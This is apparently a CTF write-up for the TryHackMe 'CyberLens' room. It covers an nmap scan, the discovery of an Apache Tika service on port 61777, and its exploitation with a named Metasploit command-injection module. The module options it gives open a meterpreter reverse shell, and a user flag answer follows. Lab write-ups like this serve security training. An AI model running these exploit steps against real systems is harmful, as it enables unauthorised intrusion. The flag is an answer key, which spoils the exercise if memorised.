# CyberLens

### CyberLens
Be sure to add the IP to your /etc/hosts file: `sudo echo '10.10.46.248 cyberlens.thm' >> /etc/hosts`<br />
After an initial scan to check what ports are open, this is the result of a more targeted scan: 

    nmap 10.10.46.248 -p80,135,139,445,3389 -sV -sC -oN scan
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 20:14 CEST
    Nmap scan report for cyberlens.thm (10.10.46.248)
    Host is up (0.045s latency).
    
    PORT     STATE SERVICE       VERSION
    80/tcp   open  http          Apache httpd 2.4.57 ((Win64))
    |_http-server-header: Apache/2.4.57 (Win64)
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-title: CyberLens: Unveiling the Hidden Matrix
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp  open  microsoft-ds?
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    | rdp-ntlm-info: 
    |   Target_Name: CYBERLENS
    |   NetBIOS_Domain_Name: CYBERLENS
    |   NetBIOS_Computer_Name: CYBERLENS
    |   DNS_Domain_Name: CyberLens
    |   DNS_Computer_Name: CyberLens
    |   Product_Version: 10.0.17763
    |_  System_Time: 2024-09-30T18:14:34+00:00
    |_ssl-date: 2024-09-30T18:14:42+00:00; -2s from scanner time.
    | ssl-cert: Subject: commonName=CyberLens
    | Not valid before: 2024-09-29T18:11:49
    |_Not valid after:  2025-03-31T18:11:49
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    | smb2-time: 
    |   date: 2024-09-30T18:14:37
    |_  start_date: N/A
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required
    |_clock-skew: mean: -2s, deviation: 0s, median: -2s

Opening the webserver, it seems like it is a service used to get metadata from files, specifically image files.<br />
![image](https://github.com/user-attachments/assets/eed84af8-6657-4663-9e1f-acb6e1439792)<br />
However, as you can see from the image above, one can also upload .sh files, and the service correctly labels it as sh application. 
However, after enumerating a bit the website and capturing requests with burpsuite, I noticed something interesting: <br />
![image](https://github.com/user-attachments/assets/169a4eb3-8c42-42d4-86d5-dbb990934eae)<br />
I'm making requests to port 61777 of the webserver. So I immediatly tried to scan that port to check what it is: <br />
![image](https://github.com/user-attachments/assets/18a324db-e21a-4301-acf3-d8b2a8e1a19b)<br />
Jetty is simply a web server. So I visited `cyberlens.thm:61777` to see what comes up:<br />
![image](https://github.com/user-attachments/assets/ccf85c00-4d99-4bd9-987f-057283d2d1f0)<br />
Apache Tika is an open source library used to detect and extract metadata from files. This page is apparently showing us the endpoints that we can use to interact with it. And here's an interesting endpoint: <br />
![image](https://github.com/user-attachments/assets/a6891ab3-01c4-4961-8bfe-6fd97d766fe6)<br />
![image](https://github.com/user-attachments/assets/7afb34cb-bc52-433f-80e1-b765a422ad8c)<br />
That endpoint gave me the version of the Tika software that's being used(PS, I just realized that this information was also given by the scan on port 61777, but I'm stupid). After some enumeration, I found out that this Tika version is vulnerable to command injection, and the exploit is available on metasploit. The module name is `windows/http/apache_tika_jp2_jscript)`. 
Correctly set up the options, in my case: 

    set LHOST 10.11.85.53
    set rhosts 10.10.46.248
    set rport 61777
    run
And I got a meterpreter session. Inside `C:\Users\Cyberlens\Desktop` we can find user.txt(flags are at the end of this writeup): <br />
![image](https://github.com/user-attachments/assets/727249b4-5fee-43f9-9a8f-385aeb1a4f81)<br />

- What is the user flag?  `THM{T1k4-CV3-f0r-7h3-w1n}`
- What is the admin flag? 
